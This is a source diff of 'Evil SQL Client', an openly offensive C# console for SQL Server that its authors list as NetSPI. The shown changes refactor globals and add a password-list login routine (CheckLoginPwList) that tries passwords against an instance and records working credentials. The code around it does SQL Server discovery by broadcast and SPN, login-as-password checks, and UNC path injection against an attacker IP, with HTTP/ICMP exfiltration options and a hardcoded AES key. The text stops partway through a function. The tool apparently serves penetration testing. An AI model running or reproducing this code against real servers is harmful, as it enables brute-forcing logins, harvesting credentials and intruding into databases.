@@ -1,6 +1,6 @@
 ﻿/*
-Author: Scott Sutherland(@_nullbind), NetSPI 2020
-Version: Version: v1.0
+Author: Scott Sutherland(@_nullbind), Alexander Polce Leary (@0xBadJuju), NetSPI 2023
+Version: Version: v1.2
 License: 3-clause BSD
 Description:
 Evil SQL Client(ESC) is an interactive.net SQL console client with enhanced
@@ -23,6 +23,9 @@ using System.Net.NetworkInformation;
 using System.Net;
 using System.DirectoryServices;
 using System.DirectoryServices.ActiveDirectory;
+using System.Linq;
+using System.Configuration;
+using System.Runtime.InteropServices;
 
 namespace evilsqlclient
 {
@@ -30,8 +33,51 @@ namespace evilsqlclient
     {
         public static void Main(string[] args)
         {
+            EvilCommands ec = new EvilCommands();
+
             // Run console
-            EvilCommands.RunSQLConsole();
+            if (0 == args.Length) { while (ec.RunSQLConsole(null)) { } }
+
+
+
+            List<List<string>> allCommands = new List<List<string>>();
+            List<string> goList = new List<string>();
+
+            args.ToList()
+                .ForEach(i =>
+                {
+                    i.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries)
+                     .ToList()
+                     .ForEach(j =>
+                     {
+#if DEBUG
+                         Console.WriteLine($"[D] Adding: {j}");
+#endif
+                         goList.Add(j);
+                         if (j.Equals("go", StringComparison.OrdinalIgnoreCase))
+                         {
+                             allCommands.Add(goList);
+                             goList.Clear();
+                         }
+                     });
+                });
+
+            if (0 == allCommands.Count)
+            {
+                allCommands.Add(goList);
+            }
+
+            allCommands.ForEach(k =>
+            {
+                try
+                {
+                    ec.RunSQLConsole(k.ToArray());
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+            });
         }
 
         public class EvilCommands
@@ -40,27 +86,29 @@ namespace evilsqlclient
             // GLOBAL OBJECTS
             // --------------------------------	
             #region globalobjects
-            public static DataTable MasterDiscoveredList = new DataTable();
-            public static DataTable MasterAccessList = new DataTable();
-            public static string ConnectionStringG = "";
-            public static string InstanceAllG = "disabled";
-            public static string InstanceG = "";
-            public static string UsernameG = "";
-            public static string UsertypeG = "CurrentWindowsUser";
-            public static string PasswordG = "";
-            public static string ReadyforQueryG = "no";
-            public static string ExportFileStateG = "disabled";
-            public static string ExportFilePathG = "c:\\windows\\temp\\output.csv";
-            public static string HttpStateG = "disabled";
-            public static string HttpUrlG = "http://127.0.0.1";
-            public static string IcmpStateG = "disabled";
-            public static string IcmpIpG = "127.0.0.1";
-            public static string EncStateG = "disabled";
-            public static string EncKeyG = "AllGoodThings!";
-            public static string EncSaltG = "CaptainSalty";
-            public static string TimeOutG = "1";
-            public static string DiscoveredCountG = "0";
-            public static string VerboseG = "disabled";
+            private List<AccessInfo> AccessList = new List<AccessInfo>();
+            private DataTable MasterDiscoveredList = new DataTable();
+            private DataTable MasterAccessList = new DataTable();
+            private string ConnectionStringG = "";
+            private bool InstanceAllG = false;
+            private string InstanceG = "";
+            private string UsernameG = "";
+            private UserType UsertypeG = UserType.CurrentWindowsUser;
+            private string PasswordG = "";
+            private string[] PassList;
+            private bool ReadyforQueryG = false;
+            private bool ExportFileStateG = false;
+            private string ExportFilePathG = "c:\\windows\\temp\\output.csv";
+            private bool HttpStateG = false;
+            private string HttpUrlG = "http://127.0.0.1";
+            private bool IcmpStateG = false;
+            private string IcmpIpG = "127.0.0.1";
+            private bool EncStateG = false;
+            private string EncKeyG = "AllGoodThings!";
+            private string EncSaltG = "CaptainSalty";
+            private string TimeOutG = "1";
+            private string DiscoveredCountG = "0";
+            private bool VerboseG = false;
             #endregion
 
             // --------------------------------
@@ -71,7 +119,7 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: GetHelp
             // --------------------------------		
-            public static string GetHelp()
+            public string GetHelp()
             {
                 string help = @"
     -----------------------------------------------------------------------------------------
@@ -206,7 +254,7 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: GetSQLServerFile
             // --------------------------------
-            public static string GetSQLServerFile(string filePath)
+            public string GetSQLServerFile(string filePath)
             {
                 // Status
                 Console.WriteLine("\nReading file " + filePath + "\n");
@@ -226,7 +274,7 @@ namespace evilsqlclient
                     Instance = tr.ReadLine();
                     while (Instance != null)
                     {
-                        EvilCommands.MasterDiscoveredList.Rows.Add(Instance, "");
+                        MasterDiscoveredList.Rows.Add(Instance, "");
                         Console.WriteLine(Instance);
                         Instance = tr.ReadLine();
                     }
@@ -247,7 +295,7 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: GetSQLServersBroadCast
             // --------------------------------
-            public static string GetSQLServersBroadCast()
+            public string GetSQLServersBroadCast()
             {
                 Console.WriteLine("\nSending a broadcast request to identify SQL Server instances.\n");
                 SqlDataSourceEnumerator instance = SqlDataSourceEnumerator.Instance;
@@ -259,14 +307,17 @@ namespace evilsqlclient
                 }
                 foreach (DataRow row in table.Rows)
                 {
-                    if (row["ServerName"] != DBNull.Value && Environment.MachineName.Equals(row["ServerName"].ToString()))
+#if DEBUG
+                    Console.WriteLine($"[D] {row["ServerName"]}");
+#endif
+                    if (row["ServerName"] != DBNull.Value && !Environment.MachineName.Check($"{row["ServerName"]}"))
                     {
                         string Instance = row["ServerName"].ToString();
                         if (row["InstanceName"] != DBNull.Value || !string.IsNullOrEmpty(Convert.ToString(row["InstanceName"]).Trim()))
                         {
                             Instance += @"\" + Convert.ToString(row["InstanceName"]).Trim();
                         }
-                        EvilCommands.MasterDiscoveredList.Rows.Add(Instance, "");
+                        MasterDiscoveredList.Rows.Add(Instance, string.Empty);
                         Console.WriteLine(Instance);
                     }
 
@@ -288,7 +339,7 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: GetSQLServersSpn
             // --------------------------------
-            public static string GetSQLServersSpn()
+            public string GetSQLServersSpn()
             {
                 // Create data table to store and display output
                 DataTable mytable = new DataTable();
@@ -313,7 +364,7 @@ namespace evilsqlclient
                 try
                 {
                     using (DirectorySearcher ds = new DirectorySearcher(RootDirEntry))
-                    {                                            
+                    {
                         ds.Filter = "(servicePrincipalName=*mssql*)";
                         ds.SearchScope = System.DirectoryServices.SearchScope.Subtree;
                         ds.PageSize = 1000;
@@ -352,16 +403,18 @@ namespace evilsqlclient
                                             if (ServiceType.ToLower().Contains("mssql"))
                                             {
                                                 mytable.Rows.Add(new object[] { instanceName, SamAccountName });
-                                                EvilCommands.MasterDiscoveredList.Rows.Add(instanceName, SamAccountName);
+                                                MasterDiscoveredList.Rows.Add(instanceName, SamAccountName);
                                             }
                                         }
-                                        catch
+                                        catch (Exception ex)
                                         {
+                                            Console.WriteLine(ex.Message);
                                         }
                                     }
                                 }
-                                catch
+                                catch (Exception ex)
                                 {
+                                    Console.WriteLine(ex.Message);
                                 }
                             }
                         }
@@ -435,9 +488,8 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: EncryptStringAES
             // --------------------------------
-            // Set salt - May not want the salt to be static long term :P
-            private static byte[] _salt = Encoding.Unicode.GetBytes(EncSaltG);
-            public static string EncryptStringAES(string plainText, string sharedSecret)
+            // Set salt - May not want the salt to be long term :P
+            public string EncryptStringAES(string plainText, string sharedSecret)
             {
                 if (string.IsNullOrEmpty(plainText))
                     throw new ArgumentNullException("plainText");
@@ -450,7 +502,7 @@ namespace evilsqlclient
                 try
                 {
                     // generate the key from the shared secret and the salt
-                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
+                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, Encoding.Unicode.GetBytes(EncSaltG));
 
                     // Create a RijndaelManaged object
                     aesAlg = new RijndaelManaged();
@@ -491,7 +543,7 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: DecryptStringAES
             // --------------------------------
-            public static string DecryptStringAES(string cipherText, string sharedSecret)
+            public string DecryptStringAES(string cipherText, string sharedSecret)
             {
                 if (string.IsNullOrEmpty(cipherText))
                     throw new ArgumentNullException("cipherText");
@@ -509,7 +561,7 @@ namespace evilsqlclient
                 try
                 {
                     // generate the key from the shared secret and the salt
-                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);
+                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, Encoding.Unicode.GetBytes(EncSaltG));
 
                     // Create the streams used for decryption.                
                     byte[] bytes = Convert.FromBase64String(cipherText);
@@ -548,7 +600,7 @@ namespace evilsqlclient
             // --------------------------------
             // FUNCTION: ReadByteArray
             // --------------------------------
-            private static byte[] ReadByteArray(Stream s)
+            private byte[] ReadByteArray(Stream s)
             {
                 byte[] rawLength = new byte[sizeof(int)];
                 if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
@@ -568,19 +620,19 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: LISTDATABASE
             // ------------------------------------------------------------
-            public static string ListDatabase()
+            public string ListDatabase()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -666,7 +718,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -684,19 +736,19 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: LISTTABLE
             // ------------------------------------------------------------
-            public static string ListTable()
+            public string ListTable()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -787,7 +839,7 @@ namespace evilsqlclient
                             catch (SqlException ex)
                             {
                                 Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                                if (VerboseG.Equals("enabled"))
+                                if (VerboseG)
                                 {
                                     Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                 }
@@ -807,10 +859,10 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: LISTLINKS
             // ------------------------------------------------------------
-            public static string ListLinks()
+            public string ListLinks()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
@@ -819,9 +871,9 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -910,7 +962,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -928,10 +980,10 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: CHECKUNCPATHINJECTION
             // ------------------------------------------------------------
-            public static string CheckUncPathInjection(string attackerip)
+            public string CheckUncPathInjection(string attackerip)
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
@@ -940,9 +992,9 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -987,7 +1039,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1005,10 +1057,10 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: LISTPROLEMEMBER
             // ------------------------------------------------------------
-            public static string ListRoleMembers()
+            public string ListRoleMembers()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
@@ -1017,9 +1069,9 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1082,7 +1134,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1100,10 +1152,10 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: LISTPRIVS
             // ------------------------------------------------------------
-            public static string ListPrivs()
+            public string ListPrivs()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
@@ -1112,9 +1164,9 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1193,7 +1245,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1211,19 +1263,19 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: LISTSERVERINFO
             // ------------------------------------------------------------
-            public static string ListServerInfo()
+            public string ListServerInfo()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1354,7 +1406,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1372,26 +1424,26 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: SHOWDISCOVERED
             // ------------------------------------------------------------
-            public static string ShowDiscovered()
+            public string ShowDiscovered()
             {
                 // Display output of data table
                 int linewidth = 50;
                 string columnValue = "";
                 string spaces = "";
                 int tabNumber = 1;
-                DataRow[] currentRows = EvilCommands.MasterDiscoveredList.Select(null, null, DataViewRowState.CurrentRows);
-                if (currentRows.Length > 1)
+                DataRow[] currentRows = MasterDiscoveredList.Select(null, null, DataViewRowState.CurrentRows);
+                if (currentRows.Length > 0)
                 {
                     // Display columns.
                     Console.WriteLine("\n");
-                    foreach (DataColumn column in EvilCommands.MasterDiscoveredList.Columns)
+                    foreach (DataColumn column in MasterDiscoveredList.Columns)
                     {
                         // Pad column
                         columnValue = column.ColumnName.ToString();
                         if (columnValue.Length < linewidth)
                         {
                             tabNumber = linewidth - columnValue.Length;
-                            spaces = new String(' ', tabNumber);
+                            spaces = new string(' ', tabNumber);
                         }
                         else
                         {
@@ -1406,14 +1458,20 @@ namespace evilsqlclient
                     // Display rows
                     foreach (DataRow row in currentRows)
                     {
-                        foreach (DataColumn column in EvilCommands.MasterDiscoveredList.Columns)
+#if DEBUG
+                        Console.WriteLine($"[D] {row}");
+#endif
+                        foreach (DataColumn column in MasterDiscoveredList.Columns)
                         {
+#if DEBUG
+                            Console.WriteLine($"[D] {column}");
+#endif
                             // Pad column to 50 characters
                             columnValue = row[column].ToString();
                             if (columnValue.Length < linewidth)
                             {
                                 tabNumber = linewidth - columnValue.Length;
-                                spaces = new String(' ', tabNumber);
+                                spaces = new string(' ', tabNumber);
                             }
                             else
                             {
@@ -1423,20 +1481,20 @@ namespace evilsqlclient
                             Console.Write(row[column] + spaces);
                         }
                         Console.WriteLine("\t");
-                    }                    
+                    }
                 }
 
-                Console.WriteLine("\n" + EvilCommands.MasterDiscoveredList.Rows.Count + " instances found.");
+                Console.WriteLine($"\n{MasterDiscoveredList.Rows.Count} instances found.");
                 return null;
             }
 
             // ------------------------------------------------------------
             // FUNCTION: SHOWACCESS
             // ------------------------------------------------------------
-            public static string ShowAccess()
+            public string ShowAccess()
             {
                 // Unique the list
-                DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                DataView AccessView = new DataView(MasterAccessList);
                 DataTable distinctValues = AccessView.ToTable(true, "Instance", "DomainName", "ServiceProcessID", "ServiceName", "ServiceAccount", "AuthenticationMode", "ForcedEncryption", "Clustered", "SQLServerMajorVersion", "SQLServerVersionNumber", "SQLServerEdition", "SQLServerServicePack", "OSArchitecture", "OsVersionNumber", "CurrentLogin", "CurrentLoginPassword", "IsSysadmin");
 
                 // Display the list 
@@ -1473,19 +1531,19 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: CHECKLOGINASPW
             // ------------------------------------------------------------
-            public static string CheckLoginAsPw()
+            public string CheckLoginAsPw()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1545,7 +1603,7 @@ namespace evilsqlclient
                                 {
 
                                     // Define connection string 
-                                    string ConnectionStringLogin = CreateConnectionString(instance, CurrentRecord["PrincipalName"].ToString(), CurrentRecord["PrincipalName"].ToString(), "SqlLogin", "master");
+                                    string ConnectionStringLogin = CreateConnectionString(instance, CurrentRecord["PrincipalName"].ToString(), CurrentRecord["PrincipalName"].ToString(), UserType.SqlLogin, "master");
 
                                     // Define server info query
                                     string ServerInfoQuery = @"
@@ -1633,7 +1691,7 @@ namespace evilsqlclient
                                     // Add to access list
                                     foreach (DataRow CurrentRow in LoginInfo.Select())
                                     {
-                                        EvilCommands.MasterAccessList.Rows.Add(CurrentRow["Instance"].ToString(), CurrentRow["DomainName"].ToString(), CurrentRow["ServiceProcessID"].ToString(), CurrentRow["ServiceName"].ToString(), CurrentRow["ServiceAccount"].ToString(), CurrentRow["AuthenticationMode"].ToString(), CurrentRow["ForcedEncryption"].ToString(), CurrentRow["Clustered"].ToString(), CurrentRow["SQLServerMajorVersion"].ToString(), CurrentRow["SQLServerVersionNumber"].ToString(), CurrentRow["SQLServerEdition"].ToString(), CurrentRow["SQLServerServicePack"].ToString(), CurrentRow["OSArchitecture"].ToString(), CurrentRow["OsVersionNumber"].ToString(), CurrentRow["Currentlogin"].ToString(), CurrentRow["IsSysadmin"].ToString(), CurrentRow["Currentlogin"].ToString());
+                                        MasterAccessList.Rows.Add(CurrentRow["Instance"].ToString(), CurrentRow["DomainName"].ToString(), CurrentRow["ServiceProcessID"].ToString(), CurrentRow["ServiceName"].ToString(), CurrentRow["ServiceAccount"].ToString(), CurrentRow["AuthenticationMode"].ToString(), CurrentRow["ForcedEncryption"].ToString(), CurrentRow["Clustered"].ToString(), CurrentRow["SQLServerMajorVersion"].ToString(), CurrentRow["SQLServerVersionNumber"].ToString(), CurrentRow["SQLServerEdition"].ToString(), CurrentRow["SQLServerServicePack"].ToString(), CurrentRow["OSArchitecture"].ToString(), CurrentRow["OsVersionNumber"].ToString(), CurrentRow["Currentlogin"].ToString(), CurrentRow["IsSysadmin"].ToString(), CurrentRow["Currentlogin"].ToString());
                                     }
 
                                 }
@@ -1646,7 +1704,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1661,22 +1719,182 @@ namespace evilsqlclient
                 return null;
             }
 
+            /// <summary>
+            /// Attempts to login to an instance with multiple possible passwords
+            /// </summary>
+            /// <param name="instance"></param>
+            /// <param name="username"></param>
+            /// <param name="passwords"></param>
+            public void CheckLoginPwList()
+            {
+                CheckQueryReady();
+                if (!ReadyforQueryG)
+                {
+                    Console.WriteLine("\nNo target instances have been defined.");
+                    return;
+                }
+
+                string fullcommand = @"
+							-- Get SQL Server Information
+
+							-- Get SQL Server Service Name and Path
+							DECLARE @SQLServerInstance varchar(250)
+							DECLARE @SQLServerServiceName varchar(250)
+							if @@SERVICENAME = 'MSSQLSERVER'
+							BEGIN
+							set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
+							set @SQLServerServiceName = 'MSSQLSERVER'
+							END
+							ELSE
+							BEGIN
+							set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
+							set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
+							END
+
+							-- Get SQL Server Service Account
+							DECLARE @ServiceaccountName varchar(250)
+							EXECUTE master.dbo.xp_instance_regread
+							N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
+							N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'
+
+							-- Get authentication mode
+							DECLARE @AuthenticationMode INT
+							EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+							N'Software\Microsoft\MSSQLServer\MSSQLServer',
+							N'LoginMode', @AuthenticationMode OUTPUT
+
+							-- Get the forced encryption flag
+							BEGIN TRY 
+								DECLARE @ForcedEncryption INT
+								EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
+								N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
+								N'ForceEncryption', @ForcedEncryption OUTPUT
+							END TRY
+							BEGIN CATCH	            
+							END CATCH
+
+							-- Return server and version information
+							SELECT  @@servername as [Instance],
+							DEFAULT_DOMAIN() as [DomainName],
+							SERVERPROPERTY('processid') as ServiceProcessID,
+							@SQLServerServiceName as [ServiceName],
+							@ServiceAccountName as [ServiceAccount],
+							(SELECT CASE @AuthenticationMode
+							WHEN 1 THEN 'Windows Authentication'
+							WHEN 2 THEN 'Windows and SQL Server Authentication'
+							ELSE 'Unknown'
+							END) as [AuthenticationMode],
+							@ForcedEncryption as ForcedEncryption,
+							CASE  SERVERPROPERTY('IsClustered')
+							WHEN 0
+							THEN 'No'
+							ELSE 'Yes'
+							END as [Clustered],
+							SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
+							SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
+							serverproperty('Edition') as [SQLServerEdition],
+							SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
+							SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
+							RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
+							SYSTEM_USER as [Currentlogin],
+							(select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";
+
+                foreach (string password in PassList)
+                {
+                    Console.WriteLine($"\n{InstanceG}: ATTEMPTING LOGIN with Username: \"{UsernameG}\" Password: \"{password}\"");
+                    string connectionString = CreateConnectionString(InstanceG, UsernameG, password, UsertypeG, "master");
+#if DEBUG
+                    Console.WriteLine(connectionString);
+#endif
+                    SqlConnection conn = new SqlConnection(connectionString);
+                    SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
+
+                    if (!OpenConnection(conn, InstanceG))
+                    {
+                        continue;
+                    }
+
+                    try
+                    {
+                        DataTable dt = new DataTable();
+                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
+                        da.Fill(dt);
+
+                        foreach (DataRow CurrentRecord in dt.Select())
+                        {
+                            Console.WriteLine();
+                            Console.WriteLine($"Instance             : {CurrentRecord["Instance"]}");
+                            Console.WriteLine($"Domain               : {CurrentRecord["DomainName"]}");
+                            Console.WriteLine($"Service PID          : {CurrentRecord["ServiceProcessID"]}");
+                            Console.WriteLine($"Service Name         : {CurrentRecord["ServiceName"]}");
+                            Console.WriteLine($"Service Account      : {CurrentRecord["ServiceAccount"]}");
+                            Console.WriteLine($"Authentication Mode  : {CurrentRecord["AuthenticationMode"]}");
+                            Console.WriteLine($"Forced Encryption    : {CurrentRecord["ForcedEncryption"]}");
+                            Console.WriteLine($"Clustered            : {CurrentRecord["Clustered"]}");
+                            Console.WriteLine($"SQL Version          : {CurrentRecord["SQLServerMajorVersion"]}");
+                            Console.WriteLine($"SQL Version Number   : {CurrentRecord["SQLServerVersionNumber"]}");
+                            Console.WriteLine($"SQL Edition          : {CurrentRecord["SQLServerEdition"]}");
+                            Console.WriteLine($"SQL Service Pack     : {CurrentRecord["SQLServerServicePack"]}");
+                            Console.WriteLine($"OS Architecture      : {CurrentRecord["OSArchitecture"]}");
+                            Console.WriteLine($"OS Version Number    : {CurrentRecord["OsVersionNumber"]}");
+                            Console.WriteLine($"Login                : {CurrentRecord["CurrentLogin"]}");
+                            Console.WriteLine($"Login is Sysadmin    : {CurrentRecord["IsSysadmin"]}");
+
+                            MasterAccessList.Rows.Add(
+                                CurrentRecord["Instance"].ToString(), 
+                                CurrentRecord["DomainName"].ToString(), 
+                                CurrentRecord["ServiceProcessID"].ToString(), 
+                                CurrentRecord["ServiceName"].ToString(), 
+                                CurrentRecord["ServiceAccount"].ToString(), 
+                                CurrentRecord["AuthenticationMode"].ToString(), 
+                                CurrentRecord["ForcedEncryption"].ToString(), 
+                                CurrentRecord["Clustered"].ToString(), 
+                                CurrentRecord["SQLServerMajorVersion"].ToString(), 
+                                CurrentRecord["SQLServerVersionNumber"].ToString(), 
+                                CurrentRecord["SQLServerEdition"].ToString(), 
+                                CurrentRecord["SQLServerServicePack"].ToString(), 
+                                CurrentRecord["OSArchitecture"].ToString(), 
+                                CurrentRecord["OsVersionNumber"].ToString(), 
+                                CurrentRecord["CurrentLogin"].ToString(), 
+                                CurrentRecord["IsSysadmin"].ToString(), 
+                                password
+                            );
+                            
+                            
+                            AccessList.Add(new AccessInfo(CurrentRecord) { CurrentLoginPassword = password });
+                        }
+
+                        return;
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"{InstanceG}: QUERY FAILED");
+                        if (VerboseG)
+                        {
+                            Console.WriteLine();
+                            Console.WriteLine(ex.Message);
+                            Console.WriteLine();
+                        }
+                    }
